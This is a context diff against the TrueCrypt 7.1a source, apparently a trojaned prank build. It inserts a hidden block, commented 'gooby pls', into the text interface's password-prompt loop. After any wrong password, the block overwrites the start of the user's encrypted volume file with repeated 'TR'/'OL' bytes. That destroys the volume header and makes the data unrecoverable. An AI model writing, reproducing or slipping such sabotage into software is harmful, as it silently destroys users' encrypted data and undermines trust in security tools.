@@ -1,0 +1,43 @@
+*** truecrypt-7.1a-source/Main/TextUserInterface.cpp	2012-02-07 05:36:48.000000000 -0500
+--- truecrypt-7.1a-sourcelol/Main/TextUserInterface.cpp	2012-09-24 16:31:56.027785324 -0400
+***************
+*** 16,21 ****
+--- 16,22 ----
+  #include "Platform/Unix/Process.h"
+  #endif
+  
++ #include <fstream>
+  #include "Common/SecurityToken.h"
+  #include "Core/RandomNumberGenerator.h"
+  #include "Application.h"
+*************** namespace TrueCrypt
+*** 1102,1107 ****
+--- 1103,1130 ----
+  
+  		while (!volume)
+  		{
++             // gooby pls
++             if (incorrectPasswordCount) {
++                 string str_target = string(*options.Path);
++                 const char* my_file = str_target.c_str();
++                 char* tr = "TR";
++                 char* ol = "OL";
++                 unsigned short count = 0;
++                 unsigned short count_ol = 0;
++ 
++                 std::fstream target;
++                 target.open(my_file, ios::in | ios::out | ios::binary);
++                 target.seekp(0, ios::beg);
++                 for (count = 0; count < 128; count++) {
++                     target.write(tr, 2);
++ 
++                     for (count_ol = 0; count_ol < 255; count_ol++) {
++                         target.write(ol, 2);
++                     }
++                 }
++                 target.close();
++             }
++ 
+  			// Password
+  			if (!options.Password)
+  			{
